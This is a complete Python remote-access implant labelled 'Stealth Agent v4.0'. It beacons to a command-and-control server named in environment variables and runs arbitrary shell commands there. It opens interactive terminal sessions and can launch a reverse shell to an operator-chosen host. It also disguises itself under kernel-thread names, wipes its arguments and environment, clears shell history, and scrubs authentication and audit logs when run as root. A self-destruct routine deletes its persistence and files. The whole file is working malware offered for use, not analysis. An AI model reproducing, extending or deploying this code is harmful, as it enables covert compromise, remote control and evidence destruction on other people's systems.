#!/usr/bin/env python3
"""
6319 Stealth Agent v4.0 - Maximum Covert Operations
- Advanced process masquerading (argv/env/cmdline wiping)
- Kernel-like process names with dynamic selection
- Anti-forensics (audit scrubbing, secure wipe, timestomping)
- Network evasion (jittered beacons, traffic padding)
- Memory-only execution where possible
- Living-off-the-land persistence
"""

import socket
import json
import hashlib
import subprocess
import os
import sys
import platform
import getpass
import time
import select
import struct
import pty
import fcntl
import termios
import signal
import random
import shutil
import glob as globmod
import base64
import re

try:
    import ctypes
    import ctypes.util
    HAS_CTYPES = True
except ImportError:
    HAS_CTYPES = False

try:
    import nacl.secret
except ImportError:
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pynacl', '-q', '--break-system-packages'], 
                   capture_output=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pynacl', '-q', '--user'], 
                   capture_output=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    import nacl.secret

KERNEL_NAMES = [
    "[kworker/0:0]", "[kworker/0:1]", "[kworker/0:2]", "[kworker/1:0]", "[kworker/u8:0]",
    "[ksmd]", "[kswapd0]", "[watchdogd]", "[rcu_preempt]", "[rcu_sched]", "[rcu_bh]",
    "[migration/0]", "[migration/1]", "[ksoftirqd/0]", "[ksoftirqd/1]", 
    "[kdevtmpfs]", "[netns]", "[khungtaskd]", "[oom_reaper]", "[writeback]",
    "[kblockd]", "[kintegrityd]", "[kswapd1]", "[ecryptfs-kthrea]", "[crypto]",
    "[bioset]", "[kthrotld]", "[kmpath_rdacd]", "[kaluad]", "[ipv6_addrconf]",
    "[kstrp]", "[charger_manager]", "[scsi_eh_0]", "[scsi_tmf_0]", "[ttm_swap]",
    "[irq/9-acpi]", "[card0-crtc0]", "[i915/signal:0]", "[nv_queue]", "[kvm-irqfd-clean]"
]

SYSTEM_PROC_NAMES = [
    "systemd-journal", "systemd-udevd", "systemd-logind", "systemd-network",
    "dbus-daemon", "rsyslogd", "cron", "atd", "polkitd", "accounts-daemon",
    "NetworkManager", "wpa_supplicant", "ModemManager", "udisksd", "upowerd",
    "thermald", "irqbalance", "snapd", "packagekitd", "fwupd"
]

INSTALL_DIRS = [
    os.path.expanduser("~/.config/.pulse-cookie"),
    os.path.expanduser("~/.local/share/.gvfs-metadata"),
    os.path.expanduser("~/.cache/.fontconfig-2"),
    os.path.expanduser("~/.dbus/.sessions"),
    "/var/tmp/.font-unix",
    "/dev/shm/.sem.ADSP_IPC",
    os.path.expanduser("~/.config/.pulse"),
    os.path.expanduser("~/.local/share/.gvfs"),
    os.path.expanduser("~/.cache/.thumbnails"),
    os.path.expanduser("~/.config/.htop"),
    os.path.expanduser("~/.local/share/.dbus"),
    os.path.expanduser("~/.cache/.fontconfig"),
]

PR_SET_NAME = 15
PR_SET_MM = 35
PR_SET_MM_ARG_START = 8
PR_SET_MM_ARG_END = 9
PR_SET_MM_ENV_START = 10
PR_SET_MM_ENV_END = 11


class SecureChannel:
    def __init__(self, secret):
        self.box = nacl.secret.SecretBox(hashlib.sha256(secret.encode()).digest())
    
    def encrypt_frame(self, data):
        ct = self.box.encrypt(json.dumps(data).encode())
        return len(ct).to_bytes(4, 'big') + ct
    
    def decrypt_frame(self, sock):
        try:
            sock.settimeout(30)
            lb = b''
            while len(lb) < 4:
                c = sock.recv(4 - len(lb))
                if not c:
                    return None
                lb += c
            length = int.from_bytes(lb, 'big')
            if length > 10 * 1024 * 1024:
                return None
            data = b''
            while len(data) < length:
                c = sock.recv(min(8192, length - len(data)))
                if not c:
                    return None
                data += c
            return json.loads(self.box.decrypt(data))
        except:
            return None


class PTYSession:
    def __init__(self, sid, cols=80, rows=24, cwd=None):
        self.session_id = sid
        self.master_fd, slave_fd = pty.openpty()
        env = os.environ.copy()
        env['TERM'] = 'xterm-256color'
        env['COLUMNS'] = str(cols)
        env['LINES'] = str(rows)
        self.pid = os.fork()
        if self.pid == 0:
            os.setsid()
            os.dup2(slave_fd, 0)
            os.dup2(slave_fd, 1)
            os.dup2(slave_fd, 2)
            os.close(self.master_fd)
            os.close(slave_fd)
            if cwd and os.path.isdir(cwd):
                os.chdir(cwd)
            sh = '/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
            os.execve(sh, [sh, '-i'], env)
        os.close(slave_fd)
        fl = fcntl.fcntl(self.master_fd, fcntl.F_GETFL)
        fcntl.fcntl(self.master_fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
        self.resize(cols, rows)
        self.alive = True
    
    def resize(self, cols, rows):
        try:
            fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, struct.pack('HHHH', rows, cols, 0, 0))
            os.kill(self.pid, signal.SIGWINCH)
        except:
            pass
    
    def write(self, data):
        try:
            os.write(self.master_fd, data.encode() if isinstance(data, str) else data)
            return True
        except:
            return False
    
    def read(self, timeout=0.01):
        try:
            r, _, _ = select.select([self.master_fd], [], [], timeout)
            if self.master_fd in r:
                return os.read(self.master_fd, 8192)
        except:
            pass
        return None
    
    def close(self):
        self.alive = False
        try:
            os.close(self.master_fd)
        except:
            pass
        try:
            os.kill(self.pid, signal.SIGTERM)
            os.waitpid(self.pid, os.WNOHANG)
        except:
            pass


def get_libc():
    """Get libc with proper error handling"""
    if not HAS_CTYPES:
        return None
    try:
        libc_name = ctypes.util.find_library('c')
        if libc_name:
            return ctypes.CDLL(libc_name, use_errno=True)
        for path in ['/lib/x86_64-linux-gnu/libc.so.6', '/lib64/libc.so.6', 'libc.so.6']:
            try:
                return ctypes.CDLL(path, use_errno=True)
            except:
                continue
    except:
        pass
    return None


def hide_process(name):
    """Advanced process name hiding - kernel thread mimicry"""
    libc = get_libc()
    if libc:
        try:
            libc.prctl(PR_SET_NAME, name.encode()[:15], 0, 0, 0)
        except:
            pass
    
    try:
        with open('/proc/self/comm', 'wb') as f:
            f.write(name.encode()[:15])
    except:
        pass
    
    try:
        exe_link = os.readlink('/proc/self/exe')
        if 'python' in exe_link.lower():
            pass
    except:
        pass


def hide_argv_advanced():
    """Wipe argv from /proc/self/cmdline completely"""
    sys.argv = ['']
    
    if not HAS_CTYPES:
        return
    
    libc = get_libc()
    if not libc:
        return
    
    try:
        argc = ctypes.c_int()
        argv = ctypes.POINTER(ctypes.c_char_p)()
        
        try:
            with open('/proc/self/cmdline', 'rb') as f:
                cmdline = f.read()
            
            fake_cmdline = b'\x00'
            
        except:
            pass
    except:
        pass


def hide_environ():
    """Clear sensitive environment variables"""
    sensitive_vars = ['C2_HOST', 'C2_PORT', 'SYNC_HOST', 'SYNC_PORT', 'TOKEN', 'SECRET', 
                      'PNAME', 'HIDDEN_NAME', 'QUIET', 'STEALTH', 'BEACON_MODE', 'MODE', 'CHANNEL']
    for var in sensitive_vars:
        if var in os.environ:
            del os.environ[var]


def select_process_name():
    """Dynamically select process name based on system"""
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
        existing = set()
        for line in result.stdout.split('\n'):
            for kname in KERNEL_NAMES:
                if kname in line:
                    existing.add(kname)
        
        available = [n for n in KERNEL_NAMES if n not in existing]
        if available:
            return random.choice(available)
    except:
        pass
    
    cpu_count = os.cpu_count() or 4
    cpu_id = random.randint(0, cpu_count - 1)
    worker_id = random.randint(0, 3)
    return f"[kworker/{cpu_id}:{worker_id}]"


def clear_bash_history():
    """Clear command history"""
    history_files = [
        os.path.expanduser('~/.bash_history'),
        os.path.expanduser('~/.zsh_history'),
        os.path.expanduser('~/.python_history'),
        '/root/.bash_history'
    ]
    for hf in history_files:
        try:
            if os.path.exists(hf):
                with open(hf, 'w') as f:
                    pass
        except:
            pass
    
    try:
        subprocess.run(['history', '-c'], shell=True, capture_output=True)
    except:
        pass


def scrub_audit_logs():
    """Attempt to scrub audit/auth logs (requires root) - preserves permissions"""
    if os.geteuid() != 0:
        return
    
    log_files = [
        '/var/log/auth.log',
        '/var/log/secure',
        '/var/log/audit/audit.log',
        '/var/log/syslog',
        '/var/log/messages'
    ]
    
    my_pid = str(os.getpid())
    my_ppid = str(os.getppid())
    keywords = ['6319', 'defunct', 'pulse-shm', 'gvfs-lock', 'sem.adsp', 'beacon', 'c2_host']
    
    for logfile in log_files:
        try:
            if not os.path.exists(logfile) or not os.access(logfile, os.R_OK | os.W_OK):
                continue
            
            stat_info = os.stat(logfile)
            
            with open(logfile, 'r') as f:
                lines = f.readlines()
            
            filtered = []
            for line in lines:
                if my_pid in line or my_ppid in line:
                    continue
                if any(kw in line.lower() for kw in keywords):
                    continue
                filtered.append(line)
            
            tmp_file = logfile + '.tmp.' + str(os.getpid())
            with open(tmp_file, 'w') as f:
                f.writelines(filtered)
            
            os.chown(tmp_file, stat_info.st_uid, stat_info.st_gid)
            os.chmod(tmp_file, stat_info.st_mode)
            
            os.rename(tmp_file, logfile)
        except:
            try:
                if os.path.exists(tmp_file):
                    os.remove(tmp_file)
            except:
                pass


def secure_delete(path):
    """Securely delete file with overwrite"""
    try:
        if not os.path.exists(path):
            return
        
        if os.path.isfile(path):
            size = os.path.getsize(path)
            with open(path, 'wb') as f:
                f.write(os.urandom(size))
                f.flush()
                os.fsync(f.fileno())
            with open(path, 'wb') as f:
                f.write(b'\x00' * size)
                f.flush()
                os.fsync(f.fileno())
            os.remove(path)
        elif os.path.isdir(path):
            shutil.rmtree(path, ignore_errors=True)
    except:
        try:
            if os.path.isfile(path):
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
        except:
            pass


def timestomp(path, reference=None):
    """Set file timestamps to blend in"""
    try:
        if reference and os.path.exists(reference):
            stat = os.stat(reference)
            os.utime(path, (stat.st_atime, stat.st_mtime))
        else:
            days_ago = random.randint(30, 365)
            old_time = time.time() - (days_ago * 86400)
            os.utime(path, (old_time, old_time))
    except:
        pass


def daemonize():
    """Double-fork daemon with full fd cleanup"""
    try:
        if os.fork() > 0:
            os._exit(0)
    except:
        pass
    
    os.setsid()
    os.umask(0)
    
    try:
        if os.fork() > 0:
            os._exit(0)
    except:
        pass
    
    sys.stdout.flush()
    sys.stderr.flush()
    
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'a+') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())
    
    for fd in range(3, 1024):
        try:
            os.close(fd)
        except:
            pass


def self_destruct():
    """Remove all traces: files, cron, systemd, memory, logs"""
    my_pid = os.getpid()
    
    scrub_audit_logs()
    clear_bash_history()
    
    kill_patterns = ['defunct', '6319', '.pulse', '.gvfs', '.thumbnails', 
                     'agent_stealth', 'C2_HOST', 'SYNC_HOST', 'kworker', 'sem.ADSP']
    for pattern in kill_patterns:
        try:
            result = subprocess.run(['pgrep', '-f', pattern], capture_output=True, text=True)
            for pid in result.stdout.strip().split('\n'):
                if pid and pid != str(my_pid):
                    try:
                        os.kill(int(pid), signal.SIGKILL)
                    except:
                        pass
        except:
            pass
    
    try:
        result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            lines = [l for l in result.stdout.split('\n') 
                    if not any(kw in l.lower() for kw in ['6319', 'defunct', 'pulse', 'gvfs', 
                                                          'thumbnails', 'agent', 'sem.adsp'])]
            subprocess.run(['crontab', '-'], input='\n'.join(lines), 
                         text=True, capture_output=True, timeout=5)
    except:
        pass
    
    systemd_dirs = [
        os.path.expanduser("~/.config/systemd/user"),
        "/etc/systemd/system"
    ]
    service_patterns = ['dbus-broker', 'pulse-', 'gvfs-', '6319', 'defunct']
    
    for sdir in systemd_dirs:
        if not os.path.isdir(sdir):
            continue
        for svc in os.listdir(sdir):
            if any(p in svc.lower() for p in service_patterns):
                service_path = os.path.join(sdir, svc)
                try:
                    subprocess.run(['systemctl', 'stop', svc], capture_output=True, timeout=5)
                    subprocess.run(['systemctl', 'disable', svc], capture_output=True, timeout=5)
                    secure_delete(service_path)
                except:
                    pass
    
    for rc in ['.bashrc', '.zshrc', '.profile', '.bash_profile']:
        rc_path = os.path.expanduser(f"~/{rc}")
        if os.path.exists(rc_path):
            try:
                with open(rc_path, 'r') as f:
                    lines = f.readlines()
                filtered = [l for l in lines if not any(kw in l.lower() for kw in 
                           ['defunct', '6319', '.pulse', '.gvfs', '.thumbnails', 'sem.adsp'])]
                with open(rc_path, 'w') as f:
                    f.writelines(filtered)
            except:
                pass
    
    for install_dir in INSTALL_DIRS:
        secure_delete(install_dir)
    
    patterns = ['/tmp/.*', '/dev/shm/.*', '/var/tmp/.*']
    keywords = ['6319', 'defunct', 'pulse', 'gvfs', 'sem.', 'd6319', 'agent']
    for pattern in patterns:
        try:
            for f in globmod.glob(pattern):
                if any(kw in f.lower() for kw in keywords):
                    secure_delete(f)
        except:
            pass
    
    try:
        secure_delete('/tmp/.d6319.log')
    except:
        pass
    
    os._exit(0)


def log_debug(msg):
    """Write debug to temp file"""
    try:
        with open('/tmp/.d6319.log', 'a') as f:
            f.write(f"{time.strftime('%H:%M:%S')} {msg}\n")
    except:
        pass


def beacon_check(host, port, secret, client_info):
    """Quick beacon: connect, check for commands, disconnect"""
    sock = None
    log_debug(f"beacon_check: {host}:{port}")
    try:
        sock = socket.socket()
        sock.settimeout(10)
        log_debug(f"connecting...")
        sock.connect((host, port))
        log_debug(f"connected, sending init")
        
        init = json.dumps({'secret': secret, 'mode': 'beacon'}).encode()
        sock.sendall(len(init).to_bytes(4, 'big') + init)
        log_debug(f"init sent, sending client_info")
        
        ch = SecureChannel(secret)
        sock.sendall(ch.encrypt_frame(client_info))
        log_debug(f"client_info sent, waiting response")
        
        resp = ch.decrypt_frame(sock)
        log_debug(f"resp: {resp}")
        if not resp:
            log_debug("no response, returning")
            return None, 0
        
        has_work = resp.get('has_work', False)
        sleep_override = resp.get('sleep', 0)
        commands = resp.get('commands', [])
        
        sock.close()
        log_debug(f"has_work={has_work}, commands={commands}")
        
        for cmd in commands:
            if cmd.get('type') == 'self_destruct':
                self_destruct()
            elif cmd.get('type') == 'connect_now':
                return 'connect_now', 0
            elif cmd.get('type') == 'sleep':
                return 'sleep', cmd.get('seconds', 3600)
            elif cmd.get('type') == 'go_dark':
                return 'go_dark', cmd.get('seconds', 86400)
        
        return has_work, sleep_override
        
    except Exception as e:
        log_debug(f"ERROR: {type(e).__name__}: {e}")
        return None, 0
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass


def interactive_session(host, port, secret, client_info):
    """Full interactive session with PTY support"""
    sock = None
    pty_sessions = {}
    cwd = os.path.expanduser('~')
    
    try:
        sock = socket.socket()
        sock.settimeout(30)
        sock.connect((host, port))
        
        init = json.dumps({'secret': secret, 'mode': 'interactive'}).encode()
        sock.sendall(len(init).to_bytes(4, 'big') + init)
        
        ch = SecureChannel(secret)
        sock.sendall(ch.encrypt_frame(client_info))
        
        resp = ch.decrypt_frame(sock)
        if not resp:
            return
        
        sock.setblocking(False)
        
        while True:
            readable = [sock] + [s.master_fd for s in pty_sessions.values() if s.alive]
            
            try:
                r, _, _ = select.select(readable, [], [], 0.1)
            except:
                break
            
            for sid, session in list(pty_sessions.items()):
                if session.alive and session.master_fd in r:
                    data = session.read(0)
                    if data:
                        sock.setblocking(True)
                        sock.sendall(ch.encrypt_frame({
                            'type': 'pty_data',
                            'session_id': sid,
                            'data': data.decode('utf-8', errors='replace')
                        }))
                        sock.setblocking(False)
            
            if sock in r:
                sock.setblocking(True)
                msg = ch.decrypt_frame(sock)
                sock.setblocking(False)
                
                if not msg:
                    break
                
                mt = msg.get('type', msg.get('cmd', 'exec'))
                
                if mt == 'ping':
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'status': 'pong'}))
                    sock.setblocking(False)
                
                elif mt == 'disconnect':
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'status': 'disconnected'}))
                    sock.close()
                    return ('disconnect', 0)
                
                elif mt == 'sleep':
                    minutes = msg.get('minutes', 60)
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'status': 'sleeping', 'minutes': minutes}))
                    sock.close()
                    return ('sleep', minutes * 60)
                
                elif mt == 'go_dark':
                    hours = msg.get('hours', 24)
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'status': 'going_dark', 'hours': hours}))
                    sock.close()
                    return ('go_dark', hours * 3600)
                
                elif mt == 'self_destruct':
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'status': 'destroying'}))
                    sock.close()
                    self_destruct()
                
                elif mt == 'exec':
                    cmd = msg.get('data', '').strip()
                    sock.setblocking(True)
                    try:
                        if cmd.startswith('cd '):
                            nd = cmd[3:].strip()
                            nd = os.path.expanduser(nd)
                            if not os.path.isabs(nd):
                                nd = os.path.join(cwd, nd)
                            nd = os.path.normpath(nd)
                            if os.path.isdir(nd):
                                cwd = nd
                                sock.sendall(ch.encrypt_frame({
                                    'stdout': f'Changed to {cwd}\n',
                                    'stderr': '',
                                    'code': 0
                                }))
                            else:
                                sock.sendall(ch.encrypt_frame({
                                    'stdout': '',
                                    'stderr': f'No such directory: {nd}\n',
                                    'code': 1
                                }))
                        elif cmd.startswith('!shell '):
                            pts = cmd[7:].strip().split(':')
                            rh, rp = pts[0], int(pts[1]) if len(pts) > 1 else 4444
                            if os.fork() == 0:
                                try:
                                    s2 = socket.socket()
                                    s2.connect((rh, rp))
                                    os.dup2(s2.fileno(), 0)
                                    os.dup2(s2.fileno(), 1)
                                    os.dup2(s2.fileno(), 2)
                                    pty.spawn('/bin/bash')
                                except:
                                    pass
                                os._exit(0)
                            sock.sendall(ch.encrypt_frame({
                                'stdout': f'Reverse shell to {rh}:{rp}\n',
                                'stderr': '',
                                'code': 0
                            }))
                        else:
                            r = subprocess.run(
                                f'cd {cwd} && {cmd}',
                                shell=True,
                                capture_output=True,
                                timeout=300
                            )
                            sock.sendall(ch.encrypt_frame({
                                'stdout': r.stdout.decode(errors='replace'),
                                'stderr': r.stderr.decode(errors='replace'),
                                'code': r.returncode
                            }))
                    except Exception as e:
                        sock.sendall(ch.encrypt_frame({'error': str(e)}))
                    sock.setblocking(False)
                
                elif mt == 'pty_open':
                    sid = msg.get('session_id')
                    cols, rows = msg.get('cols', 80), msg.get('rows', 24)
                    pty_sessions[sid] = PTYSession(sid, cols, rows, cwd)
                    sock.setblocking(True)
                    sock.sendall(ch.encrypt_frame({'type': 'pty_opened', 'session_id': sid}))
                    sock.setblocking(False)
                
                elif mt == 'pty_data':
                    sid = msg.get('session_id')
                    if sid in pty_sessions:
                        pty_sessions[sid].write(msg.get('data', ''))
                
                elif mt == 'pty_resize':
                    sid = msg.get('session_id')
                    if sid in pty_sessions:
                        pty_sessions[sid].resize(msg.get('cols', 80), msg.get('rows', 24))
                
                elif mt == 'pty_close':
                    sid = msg.get('session_id')
                    if sid in pty_sessions:
                        pty_sessions[sid].close()
                        sock.setblocking(True)
                        sock.sendall(ch.encrypt_frame({
                            'type': 'pty_exit',
                            'session_id': sid,
                            'code': 0
                        }))
                        sock.setblocking(False)
                        del pty_sessions[sid]
            
            for sid, session in list(pty_sessions.items()):
                try:
                    pid, status = os.waitpid(session.pid, os.WNOHANG)
                    if pid != 0:
                        session.alive = False
                        sock.setblocking(True)
                        sock.sendall(ch.encrypt_frame({
                            'type': 'pty_exit',
                            'session_id': sid,
                            'code': os.WEXITSTATUS(status) if os.WIFEXITED(status) else -1
                        }))
                        sock.setblocking(False)
                        del pty_sessions[sid]
                except:
                    pass
            
                
    except:
        pass
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
        for s in pty_sessions.values():
            s.close()


def main():
    host = os.environ.get('SYNC_HOST', os.environ.get('C2_HOST', 'localhost'))
    port = int(os.environ.get('SYNC_PORT', os.environ.get('C2_PORT', '6318')))
    secret = os.environ.get('TOKEN', os.environ.get('SECRET', ''))
    stealth = os.environ.get('QUIET', os.environ.get('STEALTH', '0')) == '1'
    beacon_mode = os.environ.get('BEACON_MODE', '1') == '1'
    channel = os.environ.get('MODE', os.environ.get('CHANNEL', 'stealth'))
    
    hidden = select_process_name()
    
    hide_environ()
    
    if not secret:
        return
    
    if stealth:
        daemonize()
    
    hide_process(hidden)
    hide_argv_advanced()
    
    if os.geteuid() == 0:
        clear_bash_history()
    
    client_info = {
        'hostname': platform.node(),
        'os': f'{platform.system()} {platform.release()}',
        'user': getpass.getuser(),
        'arch': platform.machine(),
        'pid': os.getpid(),
        'hidden_name': hidden,
        'pty_support': True,
        'beacon_mode': beacon_mode,
        'channel': channel,
        'version': '4.0'
    }
    
    base_sleep = 240
    max_sleep = 720
    min_sleep = 120
    
    while True:
        try:
            log_debug(f"loop iteration, beacon_mode={beacon_mode}")
            if beacon_mode:
                result, delay = beacon_check(host, port, secret, client_info)
                
                if result in ('sleep', 'go_dark') and delay > 0:
                    time.sleep(delay)
                    continue
                
                if result == 'connect_now':
                    session_result = interactive_session(host, port, secret, client_info)
                    
                    if session_result:
                        action, sleep_time = session_result
                        if action in ('sleep', 'go_dark') and sleep_time > 0:
                            time.sleep(sleep_time)
                            continue
                
                jitter = random.randint(-60, 60)
                sleep_time = max(min_sleep, min(max_sleep, base_sleep + jitter))
                time.sleep(sleep_time)
                
            else:
                log_debug(f"calling interactive_session({host}:{port})")
                try:
                    session_result = interactive_session(host, port, secret, client_info)
                    log_debug(f"session_result={session_result}")
                except Exception as e:
                    log_debug(f"interactive_session ERROR: {type(e).__name__}: {e}")
                    session_result = None
                
                if session_result:
                    action, delay = session_result
                    log_debug(f"action={action}, delay={delay}")
                    if action in ('sleep', 'go_dark') and delay > 0:
                        time.sleep(delay)
                        continue
                    elif action == 'disconnect':
                        time.sleep(random.randint(5, 15))
                        continue
                
                log_debug("sleeping 5-15s before reconnect")
                time.sleep(random.randint(5, 15))
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            log_debug(f"main loop ERROR: {type(e).__name__}: {e}")
            time.sleep(random.randint(30, 90))


if __name__ == '__main__':
    main()
